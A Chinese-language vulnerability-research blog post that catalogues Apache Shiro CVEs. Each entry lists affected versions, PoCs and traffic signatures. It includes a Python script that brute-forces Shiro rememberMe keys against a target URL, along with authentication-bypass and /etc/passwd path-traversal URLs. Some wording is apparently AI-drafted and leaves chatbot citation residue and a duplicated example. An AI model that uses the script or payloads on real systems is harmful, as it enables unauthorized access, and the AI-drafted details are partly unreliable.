+++
title = 'Shiro 漏洞合集'
date = 2024-05-30T22:50:39+08:00
draft = false
categories = ['漏洞研究']
tags = ['漏洞原理', 'Java', 'Shiro','框架漏洞']
+++

## 简介

Apache Shiro 是Java 的一个安全框架。Shiro 可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE 环境，也可以用在JavaEE 环境。Shiro 可以帮助我们完成：认证、授权、加密、会话管理、与Web 集成、缓存等。

- 验证用户身份
- 用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限
- 在非 Web 或 EJB 容器的环境下可以任意使用Session API
- 可以响应认证、访问控制，或者 Session 生命周期中发生的事件
- 可将一个或以上用户安全数据源数据组合成一个复合的用户 "view"(视图)
- 支持单点登录(SSO)功能
- 支持提供“Remember Me”服务，获取用户关联信息而无需登录

## rememberMe 反序列化漏洞

### CVE-2016-4437/Shiro-550（RememberMe）

#### 漏洞说明

Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程: 用户信息=>序列化=>AES加密=>base64编码=>RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本<=1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA==，这就更容易触发RCE漏洞。

Payload产生的过程：
命令=>序列化=>AES加密=>base64编码=>RememberMe Cookie值

#### 版本

- Shiro < 1.2.5

#### POC

> 参考
>
> <https://blog.knownsec.com/index.html%3Fp=5100.html>
>
> <https://github.com/w-digital-scanner/w13scan/blob/master/W13SCAN/scanners/PerFile/shiro.py>
>
> 使用 ChatGPT 生成独立脚本

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64
import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# 预定义的key列表
keys = [
    'kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==', 'WkhBTkdYSUFPSEVJX0NBVA==',
    'RVZBTk5JR0hUTFlfV0FPVQ==', 'U3ByaW5nQmxhZGUAAAAAAA==',
    'cGljYXMAAAAAAAAAAAAAAA==', 'd2ViUmVtZW1iZXJNZUtleQ==', 'fsHspZw/92PrS3XrPW+vxw==',
    'sHdIjUN6tzhl8xZMG3ULCQ==', 'WuB+y2gcHRnY2Lg9+Aqmqg==',
    'ertVhmFLUs0KTA3Kprsdag==', '2itfW92XazYRi5ltW0M2yA==', '6ZmI6I2j3Y+R1aSn5BOlAA==',
    'f/SY5TIve5WWzT4aQlABJA==', 'Jt3C93kMR9D5e8QzwfsiMw==',
    'aU1pcmFjbGVpTWlyYWNsZQ==',
]

def generator_payload(key):
    payload = b'\xac\xed\x00\x05sr\x002org.apache.shiro.subject.SimplePrincipalCollection\xa8\x7fX%\xc6\xa3\x08J\x03\x00\x01L\x00\x0frealmPrincipalst\x00\x0fLjava/util/Map;xppw\x01\x00x'
    iv = b'w\xcf\xd7\x98\xa8\xe9LD\x97LN\xd0\xa6\n\xb8\x1a'
    backend = default_backend()
    cipher = Cipher(algorithms.AES(base64.b64decode(key)), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    BS = algorithms.AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    file_body = pad(payload)
    ct = encryptor.update(file_body) + encryptor.finalize()
    base64_ciphertext = base64.b64encode(iv + ct)
    return base64_ciphertext.decode()

def check_shiro(url):
    # 检查是否是Shiro框架
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
        "Cookie": "rememberMe=2"
    }
    response = requests.get(url, headers=headers)
    if "deleteMe" in response.headers.get('Set-Cookie', ''):
        print(f"[+] {url} 使用了 Shiro 框架")
        return True
    else:
        print(f"[-] {url} 不使用 Shiro 框架")
        return False

def brute_force_shiro_key(url):
    for key in keys:
        payload = generator_payload(key)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
            "Cookie": f"rememberMe={payload}"
        }
        response = requests.get(url, headers=headers)
        if "deleteMe" not in response.headers.get('Set-Cookie', ''):
            print(f"[+] 有效的 Shiro key 发现: {key}")
            return True
    print("[-] 未能找到有效的 Shiro key")
    return False

if __name__ == "__main__":
    target_url = input("请输入目标URL: ").strip()
    if check_shiro(target_url):
        brute_force_shiro_key(target_url)
```

#### 流量特征

Cookie 中 `rememberMe` 字段的值很长

![20240530212912](https://gh.iinx.top/https://raw.githubusercontent.com/iselt/ImageBed/main/20240530212912.png)

### CVE-2019-12422/Shiro-721（RememberMe）

#### 漏洞说明

Apache Shiro 1.4.2 之前的版本默认使用 AES/CBC/PKCS5Padding 模式加密,开启 RememberMe 功能的Shiro组件将允许远程攻击者构造序列化数据，攻击者可以在已有的正常登陆的 Cookie rememberMe 值的基础上根据 Padding Oracle Attack 的原理来爆破构造出恶意的 rememberMe 字段，实施反序列化攻击。

> 漏洞复现：<https://www.cnblogs.com/qianxinggz/p/13388405.html>

#### 版本

- Shiro < 1.4.2

#### 流量特征

同 Shiro-550，且不断发很多包

## AntPathMatcher 相关漏洞

- `CVE-2016-6802` 在访问路径前加上/任意目录名/../，即可绕过访问
- `CVE-2020-1957` /demo/..;/admin/index,其中demo为授权路径，admin/index为鉴权路径 /.;/hello/aaaa
- `CVE-2020-11989` admin/page%252fABCDEFG其中admin/page为鉴权路径，ABCDEFG为随意字符串 /hello/a%25%32%66a /;/test/hello/aaa
- `CVE-2020-13933` admin/%3BABCDEFG，其中admin为鉴权路径，ABCDEFG为随意字符串
- `CVE-2020-17510` admin/%2e
- `CVE-2020-17523` admin/%20，其中admin为鉴权路径
- `CVE-2022-32532` 特定条件下的漏洞利用：当shiro使用了RegExPatternMatcher进行路由匹配时，由于Java的正则Pattern.matches解析.默认是不匹配r或者n的，因此当path中带有%0a时可绕过正则匹配 /permit/a%0any

### CVE-2016-6802

#### 漏洞说明

1.3.2 之前的 Apache Shiro 允许攻击者绕过预期的 servlet 过滤器并通过利用contextPath获得访问权限。

#### 版本

- Shiro < 1.3.2

#### POC

基本思路是在 URL 路径中插入诸如 /; 或 /../ 之类的序列，从而混淆路径规范化过程，并允许访问受限资源。

如 `http://example.com/account/index.jsp` 无权限访问

使用

```url
http://example.com/a/../account/index.jsp
```

或

```url
http://example.com/a/../account/index.jsp
```

即可绕过鉴权

#### 流量特征

见 POC

### CVE-2020-1957/Shiro-682

#### 漏洞说明

1.5.2之前的Apache Shiro，当使用Apache Shiro与Spring动态控制器时，特制的请求可能导致认证绕过。

CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。

漏洞原理：

- 客户端请求URL: /xxx/..;/admin/
- Shrio 内部处理得到校验URL为 /xxxx/..,校验通过
- SpringBoot 处理 /xxx/..;/admin/ , 最终请求 /admin/, 成功访问了后台请求。

#### 版本

- Shiro < 1.5.2

#### POC

构造恶意请求 `/xxx/..;/admin/`，即可绕过权限校验，访问到管理页面。

```url
/xxx/..;/admin/
```

#### 流量特征

见 POC

### CVE-2020-11989/Shiro-782

#### 漏洞说明

AntPathMatcher 绕过

在Shiro < 1.5.3的情况下，将Shiro与Spring Controller一起使用时，相应请求可能会导致身份验证绕过。

首先要清楚Shiro支持 Ant 风格的路径表达式配置。ANT 通配符有 3 种，如下所示：
| 通配符 | 说明 |
| ---- | ---- |
| ? | 匹配任何单字符 |
| * | 匹配0或者任意数量的字符 |
| ** | 匹配0或者更多的目录 |

解释一下就是 `/**` 之类的配置，匹配路径下的全部访问请求，包括子目录及后面的请求，如：`/admin/**` 可以匹配 `/admin/a` 或者 `/admin/b/c/d` 等请求。
对于 `/*` 的话 ，单个 `*` 不能跨目录，只能在两个 `/` 之间匹配任意数量的字符，如 `/admin/*` 可以匹配 `/admin/a` 但是不能匹配 `/admin/b/c/d`。
那么问题来了，如果我们将其配置为 `/toJsonList/*` ，但是我们访问形如 `/toJsonList/a/b` 这种路径，此时就会绕过访问权限，正确的配置应该为 `/toJsonList/**` 。

> 分析和复现：<https://www.freebuf.com/articles/network/254664.html>

#### 版本

- Shiro < 1.5.3

#### 流量特征

敏感目录请求

### CVE-2020-13933

#### 漏洞说明

AntPathMatcher 绕过

1.6.0之前的Apache Shiro，当使用Apache Shiro时，特制的HTTP请求可能导致认证绕过。

> 复现和分析：<https://www.cnblogs.com/backlion/p/14055278.html>

#### 版本

- Shiro < 1.6.0

#### 流量特征

出现 `%3b`，如 `/admin/%3bpage`，绕过权限

### CVE-2020-17510

#### 漏洞说明

AntPathMatcher 绕过

1.7.0之前的Apache Shiro，当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过。

#### 版本

- Shiro < 1.7.0

#### 流量特征

```url
/%2e
/%2e/
/%2e%2e
/%2e%2e/
```

### CVE-2020-17523

#### 版本

Apache Shiro < 1.7.1

#### 漏洞说明

CVE-2020-17523 涉及 Apache Shiro 在与 Spring 一起使用时，通过特制的 HTTP 请求可绕过认证。

#### 漏洞原理

- 攻击者发送精心构造的 HTTP 请求，利用 Shiro 与 Spring 的结合点绕过认证。
- 特制请求如 `GET /login;jsessionid=INVALID` 被处理后可绕过认证。

#### POC

```url
/login;jsessionid=INVALID
```

#### 流量特征

见 POC

### CVE-2022-32532

#### 漏洞说明

Apache Shiro在1.9.1之前，RegexRequestMatcher可能被错误配置，导致在一些servlet容器上被绕过。使用RegExPatternMatcher的正则表达式中含有.的应用程序可能会受到权限绕过的影响。

#### 版本

- Shiro < 1.9.1

### CVE-2023-22602

#### 版本

SpringBoot > 2.6 且 Shiro < 1.11.0

#### 漏洞说明

结合 Spring Boot 2.6+ 使用 Apache Shiro 时，特定构造的 HTTP 请求可能导致认证绕过。Shiro 和 Spring Boot 使用不同的模式匹配技术，导致漏洞出现【6†source】【7†source】。

#### POC

```url
/contextpath/somePath;otherPath
```

## CVE-2010-3863

### 漏洞说明

1.1.0 之前的 Apache Shiro 和 JSecurity 0.9.x 在将它们与 shiro.ini 文件中的项进行对比之前不会规范化 URI 路径，这允许远程攻击者通过精心设计的请求绕过预期的访问限制，如：/./account/index.jsp

### 版本

- Shiro < 1.1.0
- JSecurity 0.9.X

### POC

```url
/./admin
```

### 流量特征

见 POC

## CVE-2014-0074/Shiro-460

### 漏洞说明

1.2.3 之前的 Apache Shiro，当使用的 LDAP 服务器启用了无需身份验证即可绑定的功能时，允许远程攻击者通过空用户名或空密码绕过身份验证。

当LDAP服务器允许匿名访问（Anonymous）时，可以使用空用户和空密码登录，同时当LDAP开启任何人bind时，可以使用空用户和任意密码登录。这本质上来说是LDAP服务器的问题，但Shiro还是给了CVE且进行了修复

> 漏洞复现：<https://su18.org/post/shiro-1/#cve-2014-0074>

### 版本

- Shiro < 1.2.3

### POC

- 空用户和空密码

```url
/login?username=&password=
```

- 空用户和任意密码

```url
/login?username=&password=123
```

### 流量特征

见 POC

## CVE-2021-41303/Shiro-825

### 漏洞说明

1.8.0之前的Apache Shiro，当与Spring Boot一起使用Apache Shiro时，特制的HTTP请求可能会导致认证绕过。

当我有如下配置时：

```java
map.put("/admin/*", "authc");
map.put("/admin/page", "anon");
```

循环中先匹配到 `/admin/*`（这里是通过while语句对去除尾部斜线的uri进行匹配）,然后跳出循环，进入到 `filterChainManager.proxy(originalChain, requestURINoTrailingSlash);`，注意，这里真正的参数就是去除尾部斜线的uri，也就是 `/admin/page`，所以在 `DefaultFilterChainManager#getChain` 中得到的权限是 `anon`，这样就达到绕过目的。

> 漏洞分析：<https://xz.aliyun.com/t/11633>

### 版本

- Shiro < 1.8.0

### 流量特征

访问敏感目录

## CVE-2022-40664

### 漏洞说明

1.10.0之前的Apache Shiro，Shiro在通过RequestDispatcher进行请求转发(forward)或请求包括(include)时存在认证绕过漏洞。

因为代码逻辑存在漏洞，1.10.0之前的版本在请求forward时不进行拦截鉴权，导致在代码里存在对请求进行forward处理时，对应请求会绕过鉴权的问题。

该漏洞是代码中函数逻辑问题导致的。当代码中存在一些特殊的调用和逻辑时，就可能触发该漏洞，因此远程请求是合法请求，没有恶意特征，安全厂商暂无法提取规则。

### 版本

- Shiro < 1.10.0

## CVE-2023-34478

### 漏洞说明

CVE-2023-34478 涉及 Apache Shiro 在与非规范化请求路由的 API 或 Web 框架一起使用时，可能会受到路径遍历攻击，导致认证绕过。

请求如 `/app/%2e%2e%2fadmin` 被处理成对 `/admin` 的访问，从而绕过权限控制。

### 版本

Apache Shiro < 1.12.0 或 2.0.0-alpha-3

### POC

```url
/app/%2e%2e%2fadmin
```

### 流量特征

出现`%2e`、`%2f`等

## CVE-2023-46749

### 漏洞说明

CVE-2023-46749 涉及 Apache Shiro 在处理文件路径时缺乏适当的输入验证和清理，导致路径遍历攻击。这允许攻击者访问系统中原本受限的文件和目录，甚至可能执行任意代码。

### 版本

Apache Shiro < 1.13.0 或 2.0.0-alpha-4

### POC

构造恶意路径请求如 `../../etc/passwd`，可以访问系统的敏感文件。

```url
/app/../../etc/passwd
```

### 流量特征

出现 `..` 等相对路径

## 参考文章

> [Shiro(全系漏洞分析-截至20230331)](https://www.freebuf.com/vuls/362341.html)
>
> [Shiro 历史漏洞分析](https://xz.aliyun.com/t/11633)
>
> [shiro 权限绕过系列汇总](https://yinwc.github.io/2022/01/13/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%B3%BB%E5%88%97%E6%B1%87%E6%80%BB/)
